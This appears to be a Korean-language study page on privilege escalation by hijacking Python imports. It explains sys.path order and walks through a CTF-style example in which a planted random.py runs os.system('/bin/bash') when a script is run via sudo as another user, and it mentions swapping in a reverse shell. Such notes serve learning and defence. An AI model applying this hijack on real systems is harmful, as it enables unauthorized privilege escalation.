---
layout: page
title: Hijacking_Python_Library
description: >
  This chapter covers the basics of content creation with Hydejack.
hide_description: true
sitemap: false
---

0. this unordered seed list will be replaced by toc as unordered list
{:toc}


https://medium.com/@klockw3rk/privilege-escalation-hijacking-python-library-2a0e92a45ca7
https://rastating.github.io/privilege-escalation-via-python-library-hijacking/


시스템이 Python 라이브러리에서 권한을 잘못 구성한 시나리오를 접할 수 있습니다. 일반적으로 Python 모듈이 있는 디렉터리에는 상승된 권한 없이는 수정할 수 없도록 권한이 설정되어 있습니다. 이를 통해 사용자가 이 취약점을 만들 수 있는 방법에는 여러 가지가 있습니다.

---

1. 사용자가 자신의 Python 모듈을 만들고 쓰기 액세스를 제한하는 것을 잊어버립니다.
2. 사용자는 Python 라이브러리 디렉토리 내에서 제한을 완화기로 결정합니다.
3. Python 라이브러리의 PATH 변수는 현재 디렉토리를 먼저 확인하도록 구성됩니다.

그럼에도 불구하고 권한을 상승시키려면 상승된 권한으로 Python 스크립트를 실행하는 방법도 필요합니다. 이는 상승된 권한으로 Python 스크립트를 실행하거나 SUID 파일을 통해 다른 취약점을 활용하여 스크립트를 실행하는 cronjob 또는 예약된 작업을 찾는 것을 의미합니다.

![[Pasted image 20250911231826.png]]

---

권한을 상승시키는 잠재적인 방법으로 이 방법을 탐색하기로 결정했다면 먼저 Python이 모듈을 가져오기 위해 파일 시스템 내에서 어디를 찾는지 이해해야 합니다. 이를 위해 Python의 "sys" 모듈을 활용할 수 있습니다. 여기에서 자세한 내용을 읽을 수 있습니다.

```bash
python3 -c 'import sys; print(sys.path)'
```

![Pasted_image_20250911232041.png](/image/Pasted_image_20250911232041.png)

#### 작동 원리

Python은 import 문을 통해 모듈을 로드할 때, 모듈을 찾기 위해 다음과 같은 순서로 경로를 검색합니다(일반적으로 sys.path에 정의된 순서):

1. **현재 작업 디렉터리(Working Directory)**: Python 스크립트가 실행되는 디렉터리.
2. **PYTHONPATH**: 환경 변수로 설정된 경로.
3. **표준 라이브러리 경로**: Python 설치 디렉터리의 표준 라이브러리.
4. **site-packages**: pip 등을 통해 설치된 서드파티 라이브러리 경로.

공격자는 이 검색 순서를 악용하여, **Python이 먼저 검색하는 디렉터리(예: 현재 디렉터리)**에 악성 모듈(예: requests.py)을 배치합니다. 이로 인해 Python은 신뢰할 수 있는 실제 라이브러리(예: site-packages에 있는 requests) 대신 악성 모듈을 로드하게 됩니다.

Python은 모듈을 로드할 때 **현재 디렉터리(working directory)** 를 먼저 검색합니다. 이는 sys.path의 첫 번째 항목이 보통 현재 디렉터리('' 또는 .)로 설정되기 때문입니다. 예를 들어, import requests를 호출하면 Python은 먼저 현재 디렉터리에 requests.py 또는 requests 폴더가 있는지 확인한 후, 다른 경로(PYTHONPATH, site-packages 등)를 순차적으로 탐색합니다.


---

#### 공격 시나리오

1. **악성 모듈 배치**:
    
    - 공격자가 피해자의 작업 디렉터리에 악성 evil.py 파일을 배치합니다.
    - 이 파일은 실제 evil 라이브러리처럼 동작하지만, 추가로 악성 코드를 실행(예: 데이터 유출, 백도어 설치 등)합니다.
2. **공격 환경**:
    
    - 신뢰할 수 없는 소스에서 다운로드한 Python 프로젝트 폴더.
    - 공유 파일 시스템(NFS, SMB 등) 또는 클라우드 스토리지.
    - 사용자 입력으로 디렉터리 경로를 지정하는 스크립트.

```python
# 상승된 권한으로 실행되는 python 스크립트
import random
poem = """The sun was shining on the sea,
Shining with all his might:
He did his very best to make
The billows smooth and bright —
And this was odd, because it was
The middle of the night."""

for i in range(10):
    line = random.choice(poem.split("\n"))
    print("The line was:\t", line)
    
```

이 경우 import 된 random의 실제 경로는 /usr/lib/python3/~~ 이쯤 어딘가겠지만, walrus_and_the_carpenter.py와 같은 디렉터리 안에 random.py 파일을 생성함.

```python
import os
os.system("/bin/bash")
```

이후 walrus_and_the_carpenter.py가 다시 실행될 때 같은 디렉터리 내의 random.py가 먼저 검색되면서 import 하게 되고 /bin/bash가 실행되게 된다.

이후 sudo -l 의 결과를 참고해 다음과 같이 실행시킨다.

```bash
# -u : 지정된 사용자로 명령어를 실행
sudo -u rabbit python3.6 /home/alice/walrus_and_the_carpenter.py
```


---

import 된 라이브러리의 위치를 확인

```python
import random

# 로드된 모듈(random)의 경로 출력
print(random.__file__)
```

random.py의 위치가 출력되고 random.py의 권한에 쓰기 권한이 있다면 random.py 파일에 리버쉘, bash 쉘을 실행시키는 코드로 수정함.
이후 root 권한으로 실행되는 python 파일을 실행시킬 때 random 라이브러리를 들고 오면서 실행되게 된다.

